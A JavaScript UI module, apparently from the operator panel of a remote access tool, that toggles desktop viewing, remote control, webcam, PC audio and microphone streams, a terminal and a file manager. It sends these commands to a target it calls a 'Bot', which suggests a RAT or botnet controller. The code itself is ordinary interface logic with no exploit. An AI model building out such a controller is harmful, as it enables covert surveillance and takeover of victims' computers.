// frontend/client_control/js/modules/ui/header.js

import { AppState } from '../core/states.js';

/** Инициализация кнопок управления V8.0 **/
export const initHeaderControls = () => {
  const $ = id => document.getElementById(id);
  
  const actions = [
    { id: 'btn-desktop-stream', ref: AppState.desktop, key: 'observe', mod: 'ScreenView' },
    { id: 'btn-desktop-control', ref: AppState.desktop, key: 'control', mod: 'RemoteControl' },
    { id: 'btn-webcam-stream', ref: AppState.webcam, key: 'active', mod: 'Webcam' },
    { id: 'btn-audio-pc', ref: AppState.audio, key: 'output', mod: 'AudioPulse', extra: 'PC' },
    { id: 'btn-audio-mic', ref: AppState.audio, key: 'input', mod: 'AudioPulse', extra: 'Mic' }
  ];

  /** Переключение START/STOP и визуализация **/
  const toggleAction = (a, force = null, silent = false) => {
      const btn = $(a.id), state = force ?? !a.ref[a.key];
      if (a.ref[a.key] === state && force === null) return;
      
      a.ref[a.key] = state;
      btn?.classList.toggle('active', state);

      if (a.id === 'btn-desktop-control') {
        const cvs = $('desktopCanvas');
        cvs && Object.assign(cvs.style, { pointerEvents: state ? 'auto' : 'none' });
        state && cvs?.focus();
      }

      // ИСПРАВЛЕНО: Используем правильный ID из AppState
      const targetBot = AppState.clientId; 
      const actionCmd = state ? 'START' : 'STOP';
      
      console.log(`[UI:Header] Action: ${a.mod} | Cmd: ${actionCmd} | Bot: ${targetBot}`);

      if (!silent && window.sendToBot) {
          // Добавлен аргумент PAYLOAD (пустая строка для команд управления)
          window.sendToBot(a.mod, "", actionCmd, a.extra || 'none');
      } else if (!window.sendToBot) {
          console.error(`[UI:Header] CRITICAL: window.sendToBot is undefined!`);
      }
  };

  /** Обработка оверлеев **/
  const setupToggle = (id, ovlId, onOpen) => {
    const btn = $(id), ovl = $(ovlId);
    if (!btn || !ovl) return;
    btn.onclick = () => {
      const isH = ovl.classList.toggle('hidden');
      btn.classList.toggle('active', !isH);
      !isH && onOpen?.();
    };
  };

  setupToggle('btn-terminal-toggle', 'terminal-overlay', () => {
    window.resetTerminalPosition?.();
    setTimeout(() => $('terminal-cmd')?.focus(), 50);
  });
  
  setupToggle('btn-files-toggle', 'files-overlay', () => window.openFileManager?.());

  actions.forEach(a => {
    const el = $(a.id);
    el && (el.onclick = () => toggleAction(a));
  });

  /** Авто-стоп конфликтующих ресурсов **/
  window.syncModeResources = mode => {
    const termOvl = $('terminal-overlay'), filesOvl = $('files-overlay');
    const termBtn = $('btn-terminal-toggle'), filesBtn = $('btn-files-toggle');
    
    [termOvl, filesOvl].forEach(el => el?.classList.add('hidden'));
    [termBtn, filesBtn].forEach(el => el?.classList.remove('active'));
    
    if (mode === 'webcam') {
      toggleAction(actions[0], false); 
      toggleAction(actions[1], false); 
    } else if (mode === 'desktop') {
      toggleAction(actions[2], false); 
    }
  };
};